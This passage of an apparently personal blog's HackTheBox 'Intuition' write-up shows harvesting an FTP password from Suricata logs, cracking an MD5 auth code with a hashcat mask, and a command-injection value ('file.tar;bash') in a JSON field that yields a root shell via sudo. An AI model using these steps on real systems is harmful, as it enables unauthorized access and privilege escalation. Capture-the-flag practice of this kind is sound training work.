</span></span><span class="line"><span class="cl">/var/log/suricata/eve.json.7.gz:<span class="o">{</span><span class="s2">&#34;timestamp&#34;</span>:<span class="s2">&#34;2023-09-28T17:44:48.188361+0000&#34;</span>,<span class="s2">&#34;flow_id&#34;</span>:1218304978677234,<span class="s2">&#34;in_iface&#34;</span>:<span class="s2">&#34;ens33&#34;</span>,<span class="s2">&#34;event_type&#34;</span>:<span class="s2">&#34;ftp&#34;</span>,<span class="s2">&#34;src_ip&#34;</span>:<span class="s2">&#34;192.168.227.229&#34;</span>,<span class="s2">&#34;src_port&#34;</span>:45760,<span class="s2">&#34;dest_ip&#34;</span>:<span class="s2">&#34;192.168.227.13&#34;</span>,<span class="s2">&#34;dest_port&#34;</span>:21,<span class="s2">&#34;proto&#34;</span>:<span class="s2">&#34;TCP&#34;</span>,<span class="s2">&#34;tx_id&#34;</span>:2,<span class="s2">&#34;community_id&#34;</span>:<span class="s2">&#34;1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=&#34;</span>,<span class="s2">&#34;ftp&#34;</span>:<span class="o">{</span><span class="s2">&#34;command&#34;</span>:<span class="s2">&#34;PASS&#34;</span>,<span class="s2">&#34;command_data&#34;</span>:<span class="s2">&#34;Lopezz1992%123&#34;</span>,<span class="s2">&#34;completion_code&#34;</span>:<span class="o">[</span><span class="s2">&#34;230&#34;</span><span class="o">]</span>,<span class="s2">&#34;reply&#34;</span>:<span class="o">[</span><span class="s2">&#34;Login successful.&#34;</span><span class="o">]</span>,<span class="s2">&#34;reply_received&#34;</span>:<span class="s2">&#34;yes&#34;</span><span class="o">}}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>I obtained the password for user &ldquo;lopez.&rdquo; It is <strong><code>Lopezz1992%123</code></strong>. I used this password to access the account of user &ldquo;lopez.&rdquo;</p>
<p>I also gained access to FTP using:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">lopez@intuition:~$ ftp adam@127.0.0.1
</span></span><span class="line"><span class="cl">Connected to 127.0.0.1.
</span></span><span class="line"><span class="cl"><span class="m">220</span> pyftpdlib 1.5.7 ready.
</span></span><span class="line"><span class="cl"><span class="m">331</span> Username ok, send password.
</span></span><span class="line"><span class="cl">Password: adam gray
</span></span><span class="line"><span class="cl"><span class="m">230</span> Login successful.
</span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is UNIX.
</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
</span></span><span class="line"><span class="cl">ftp&gt; ls
</span></span></code></pre></td></tr></table>
</div>
</div><p>I retrieved all the cool stuff from there using the <strong><code>get &lt;file_name&gt;</code></strong> command:</p>
<ul>
<li><strong><code>payload.txt</code></strong></li>
<li><strong><code>runner1</code></strong></li>
<li><strong><code>runner1.c</code></strong></li>
<li><strong><code>run-tests.sh</code></strong></li>
</ul>
<p>The &ldquo;run-tests.sh&rdquo; file contains:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1"># List playbooks</span>
</span></span><span class="line"><span class="cl">./runner1 list
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Run playbooks [Need authentication]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ./runner run [playbook number] -a [auth code]</span>
</span></span><span class="line"><span class="cl"><span class="c1">#./runner1 run 1 -a &#34;UHI75GHI****&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Install roles [Need authentication]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ./runner install [role url] -a [auth code]</span>
</span></span><span class="line"><span class="cl"><span class="c1">#./runner1 install http://role.host.tld/role.tar -a &#34;UHI75GHI****&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The &ldquo;runner1.c&rdquo; file contains the authentication code, but it&rsquo;s hashed in MD5. I will save it somewhere naming <code>myhash.txt</code>.</p>
<p>I cracked the auth code from run-tests.sh file using the following command as we knew the first part of the authentication key **<code>UHI75GHI****</code>**and the hash was available in runner1.c:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="nt">hashcat</span><span class="p">.</span><span class="nc">exe</span> <span class="nt">-a3</span> <span class="nt">-m0</span> <span class="nt">myhash</span><span class="p">.</span><span class="nc">txt</span> <span class="nt">UHI75GHI</span><span class="o">?</span><span class="nt">u</span><span class="o">?</span><span class="nt">u</span><span class="o">?</span><span class="nt">u</span><span class="o">?</span><span class="nt">u</span> <span class="nt">--self-test-disable</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The cracked hash is <strong><code>UHI75GHINKOP</code></strong>.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-0527f" hidden>
    <label for="zoomCheck-0527f">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Untitled%2011.png" alt="Untitled" 
             />
    </label></p>
<p>I created a file named &ldquo;exploit.json&rdquo; containing:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;run&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;action&#34;</span><span class="p">:</span><span class="s2">&#34;install&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;role_file&#34;</span><span class="p">:</span><span class="s2">&#34;file.tar&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;auth_code&#34;</span><span class="p">:</span><span class="s2">&#34;UHI75GHINKOP&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We know the injection point is <strong><code>role_file</code></strong>. We need to perform command injection from <strong><code>role_file</code></strong> now. I renamed my file from <strong><code>file.tar</code></strong> to <strong><code>file.tar;bash</code></strong>. Now, I will adjust the payload in <strong><code>exploit.json</code></strong> accordingly.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;run&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;action&#34;</span><span class="p">:</span><span class="s2">&#34;install&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;role_file&#34;</span><span class="p">:</span><span class="s2">&#34;file.tar;bash&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;auth_code&#34;</span><span class="p">:</span><span class="s2">&#34;UHI75GHINKOP&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>I ran <strong><code>sudo /opt/runner2/runner2 exploit.json</code></strong> again.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">root@intuition:/home/lopez#</span> <span class="err">cd</span> <span class="err">~</span>
</span></span><span class="line"><span class="cl"><span class="err">root@intuition:~#</span> <span class="err">cat</span> <span class="err">root.txt</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">ROOT_FLAG_R</span><span class="mi">3</span><span class="err">DACT</span><span class="mi">3</span><span class="err">D</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">root@intuition:~#</span> <span class="err">id</span>
</span></span><span class="line"><span class="cl"><span class="err">uid=</span><span class="mi">0</span><span class="err">(root)</span> <span class="err">gid=</span><span class="mi">0</span><span class="err">(root)</span> <span class="err">groups=</span><span class="mi">0</span><span class="err">(root)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Boom! We now have root access. 🎉🚀</p>
<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
<p>Thanks for following along with my walkthrough! Using various tools and techniques, we successfully identified vulnerabilities, exploited them, and gained root access. Keep exploring and happy hacking!</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/hackthebox/">HackTheBox</a></li>
      <li><a href="http://localhost:1313/tags/linux/">Linux</a></li>
      <li><a href="http://localhost:1313/tags/hard/">Hard</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/writeups/hackthebox/solarlab/">
    <span class="title">« Prev</span>
    <br>
    <span>SolarLab Writeup - HackTheBox</span>
  </a>
  <a class="next" href="http://localhost:1313/writeups/hackthebox/mailing/">
    <span class="title">Next »</span>
    <br>
    <span>Mailing Writeup - HackTheBox</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="http://localhost:1313/">Rezy Dev</a></span> · 

    <span>
        <a href="https://creativecommons.org/licenses/by-nc/4.0/" rel="noopener noreferrer" target="_blank">Some rights reserved</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
